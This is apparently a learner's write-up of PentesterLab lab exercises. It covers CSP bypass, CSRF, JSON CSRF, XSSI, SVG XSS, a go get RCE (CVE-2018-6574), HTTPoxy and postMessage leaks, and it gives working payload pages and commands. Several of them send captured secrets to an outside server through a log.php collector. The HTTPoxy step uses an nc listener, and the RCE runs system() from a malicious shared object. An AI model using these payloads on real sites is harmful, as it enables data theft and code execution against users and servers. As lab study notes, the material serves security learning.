## Orange Badge

### Intro to CSP 

- https://hackerone.com/reports/153666
- `<script>alert('2fdb31a2-ca58-4650-abfb-9406be061d69')</script>` doesn't work due to CSP
- `Content-Security-Policy: default-src 'self'; script-src 'self' https://pentesterlab.com`
- But there is an XSS in `js/countdown.php?end=2534926825*1000).getTime();alert(1);//`
- So we can use `/?name=<script src="js/countdown.php?end=2534926825*1000).getTime();alert(1);//"></script>`

### CSRF

- Create users and see if any sensitive actions can be performed without tokens.
- Create a malicious page and upload it to your vps `http://18.191.42.249/csrf.html`

```
<!DOCTYPE html>
<html>
<body>
    <form method="post" action="http://ptl-55544eb5-9632baab.libcurl.so/share">
        <input name="user" value="asdf">
        <input name="id" value="0">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

```
Name	Value
PTLAB_KEY	57bea68a-1090-4329-8b94-37d4d3bb453a
```

### JSON CSRF

- The JSON request body looks like this `{"user":"asdf","id":0}`
- When we send stuff through forms they appear as `k1=v1&k2=v2`
- To fix this put everything in name.
- But everything still gets URL encoded, use `enctype="text/plain"`
- Be aware of quotes used. I tried using `'` which gave me an error, while `"` worked.

```
<html>

<body onload="document.forms[0].submit();">
<form enctype="text/plain"
      method="POST"
      action="http://ptl-2d63cb87-4d590bd7.libcurl.so/share">
<input name='{"user":"asdf","id":0,"trash":"' value='"}'>
</form>

</body>
</html>
```

```
Name	Value
PTLAB_KEY	d800b2b5-8625-4c05-a11a-9719c007b554
```

### XSSI
- This exercise covers the exploitation of a Cross-Site Scripting Include (XSSI) vulnerability.
- This type of vulnerability is common with modern applications and applications relying massively on JSON with Padding (JSONP).
- For difference between XSSI, CSRF and XSS look into https://www.scip.ch/en/?labs.20160414

xssi.html
```
<!DOCTYPE html>
<html>
<body>

<script>
function display(data) {
	var str = '';
	for (var key in data) {
		str += '<img src="http://18.191.42.249/log.php?c='+key+':'+data[key] + '">';
	}
	document.write(str);
}
</script>

<script src="http://ptl-a878d4de-fa8ca92a.libcurl.so/secrets.js"></script>
</body>
</html>
```

log.php
```
<?php

$myfile = fopen('logs.txt', 'a') or die('Unable to open file!');
$txt = $_GET['c'];
$myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
```

```
$ >logs.txt
$ cat logs.txt 
PTLAB_KEY:7d570b4a-4a01-4430-88db-2f7907382269
```

### SVG XSS

Upload HTML file and change extension through proxy

```
<html>
    <script>
        alert('2fdb31a2-ca58-4650-abfb-9406be061d69')
    </script>
</html>
```

### CVE-2018-6574: go get RCE

- This vulnerability was fixed in Go 1.8.7, 1.9.4 and 1.10rc2.
- When installing a package, Golang will build native extensions.

attack.c
```
#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("touch /tmp/owned");
}
```

```
$ gcc -shared -o attack.so -fPIC attack.c
```

```
package main
// #cgo CFLAGS: -fplugin=./attack.so
// typedef int (\*intFunc) ();
//
// int
// bridge_int_func(intFunc f)
// {
//      return f();
// }
//
// int fortytwo()
// {
//      return 42;
// }
import "C"
import "fmt"

func main() {
    f := C.intFunc(C.fortytwo)
    fmt.Println(int(C.bridge_int_func(f)))
    // Output: 42
}
```

Put all three files in a GitHub repository and `go get github.com/abhaynayar/cve-2018-6574`

### CVE-2016-5386: HTTPoxy

- https://httpoxy.org/
- The web server adds the prefix HTTP_ and capitalise the string.
- For example, the Host: header becomes the variable HTTP_HOST.
- An environment variable of such format exists: HTTP_PROXY.

Solution

- Request being made to `http://ptl-9c6cf080-93a0aa2b.libcurl.so/cgi-bin/hello.cgi`
- Add header `Proxy: 18.191.42.249:1337`
- On your vps `$ nc -lvp 1337`
- We get the key as `User-Agent: 4b25aabc-4dce-43d4-9f86-49327d4548c0`

### postMessage()

- "The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it."
- However, if the application relies on cookies and the opened page sends back sensitive information to the opening page without enforcing a targetOrigin, it's possible for a malicious page to get access to this sensitive information by getting users to visit a malicious page.
- To prevent this issue, the backend should avoid using * as the second argument of postMessage (targetOrigin).

pm1.html
```
<!DOCTYPE html>
<html>
    <body>
        <button onclick='window.open("http://ptl-12065b08-fa3f5dba.libcurl.so/key/0","ptlabdata0","height=200,width=150")'>Decrypt</button>
        <img id="asdf"></img>
        <script>
            window.addEventListener("message", function(event){
                document.getElementById("asdf").src = "http://18.191.42.249/log.php?c=" + event.data.value;
            }, false);
        </script>
    </body>
</html>
```

Success
```
http://18.191.42.249/pm1.html
15492096-e7fc-4675-b36d-d9d4f99a304e
```


